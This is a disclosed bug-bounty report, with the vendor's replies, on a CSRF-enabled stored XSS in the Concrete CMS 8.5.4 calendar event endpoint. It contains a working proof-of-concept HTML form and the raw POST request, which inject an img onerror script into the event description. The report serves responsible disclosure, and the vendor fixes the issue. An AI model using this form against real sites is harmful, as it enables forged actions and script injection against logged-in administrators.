title: Stored unauth XSS in calendar event via CSRF

profile.name: Concrete CMS
profile.about: A simple and powerful content management system.

vulnerability_information:
** crayons **
##  Description
The `description` parameter in the scenario `/index.php/ccm/calendar/dialogs/event/add/save` is affected by Stored XSS due to lack of user supplied data filtration. Also in should be mentioned that this endpoint does not verify CSRF token `ccm_token`, which leads to an ability to perform CSRF attack using specially crafted web page.

## Testing setup :
Concrete5 CMS version: 8.5.4
PHP Version: 7.2.24

## Steps to reproduce
1) Login to your privileged account 
2) Create a web page containing following code (do not forget to change form action URL to your testing server)

```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://<YOUR CONCRETE5 TESTING SERVER IP>/index.php/ccm/calendar/dialogs/event/add/save" method="POST">
      <input type="hidden" name="caID" value="1" />
      <input type="hidden" name="name" value="csrf_xss" />
      <input type="hidden" name="description" value="<img src=x onerror=alert(document.domain)>" />
      <input type="hidden" name="cID" value="0" />
      <input type="hidden" name="event_repetitionSetID[]" value="1234" />
      <input type="hidden" name="event_repetitionID_1234" value="0" />
      <input type="hidden" name="event_pdStartDate_pub_1234" value="2/12/21" />
      <input type="hidden" name="event_pdStartDate_1234" value="2021-02-12" />
      <input type="hidden" name="event_pdStartDateSelectTime_1234" value="11:00am" />
      <input type="hidden" name="publishAction" value="approve" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```

3) Open the web page from Step 2 in the same browser, where you have logged in account from step 1 and click "Submit request" button
4) Navigate to calendar tab select created event and click "Details".
5) After opening "details" XSS will fired

## Credits
This bug was found as a part of Solar Security CMS Reseach, with https://hackerone.com/d0bby, https://hackerone.com/wezery0, https://hackerone.com/silvereniqma in collaboration. Can you, please, add them to this report?

## Impact

Malicious attacker can potentially obtain sensitive information or make action on user behalf.

activities.message: Thanks for this report, we'll work to get a fix in the next release.

Hello @d3addog @d0bby @wezery0 and @silvereniqma ,  
I am reaching out to all of you since we were informed you collaborated on this report. 

We are concerned about your statement that the ccm_token is not verified server-side and would definitely like remediate that!  Could you help us out and provide an example of how it is not being checked. Thanks so much in advance. 

The founders of Concrete CMS have examined the remainder of your finding. By design, the Concrete CMS feature functionality allows a website admin/editor full control to edit his/her website and add any code he/she sees fit to that website. Hence, we do not concur that what you presented is a vulnerability. 

Looking forward to hearing back from you on the CSRF token. We really appreciate all you do to make Concrete CMS safer! ~Lisa

Hello @lisaciso,

As you can see from the POC web page "ccm_token" is absent from the POST request to the "/index.php/ccm/calendar/dialogs/event/add/save" endpoint. That makes possible to perform CSRF attack with XSS payload from the rogue webpage shown in the POC. Visiting that webpage will result in firing the following web request (make a notice that "ccm_token" is absent): 
```
POST /concrete5/index.php/ccm/calendar/dialogs/event/add/save HTTP/1.1
Host: 192.168.255.78
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:85.0) Gecko/20100101 Firefox/85.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 290
Cookie: <COOKIE>

caID=1&name=csrf_xss&description=%3Cimg+src%3Dx+onerror%3Dalert%28document.domain%29%3E&cID=0&event_repetitionSetID%5B%5D=1234&event_repetitionID_1234=0&event_pdStartDate_pub_1234=2%2F12%2F21&event_pdStartDate_1234=2021-02-12&event_pdStartDateSelectTime_1234=11%3A00am&publishAction=approve
```
Which will result in successful event creation:
{F1400784}

@d3addog 
Thanks again for all the work you did on reporting this vulnerability to us.

A fix for this vulnerability you reported has been merged into these release candidates:

9.0.0RC3https://www.concretecms.com/download_file/8c1f8bf8-6e0f-4730-bfb6-649c8213f283
8.5.6RC1https://www.concretecms.com/download_file/2e714705-d861-484f-9e33-2b7ecfd7e585

It would be greatly appreciated if you could verify that we have indeed fixed the issue.

I will be attaching a CVE to this HackerOne report. Respectfully, please do not disclose the CVE until we give you the "ok" to do so. Thanks for understanding!
~Lisa

CVE requested with title: Concrete CMS Calendar vulnerable to CSRF
@d0bby, @d3addog,@wezery0, @silvereniqma listed as discoverers.

NIST requested to credit Solar Security CMS Research Team rather than the individual previously assigned credit.  Publication of CVE has been requested. Concrete CMS 8.5.6 has been publicly released https://documentation.concretecms.org/developers/introduction/version-history/856-release-notes.
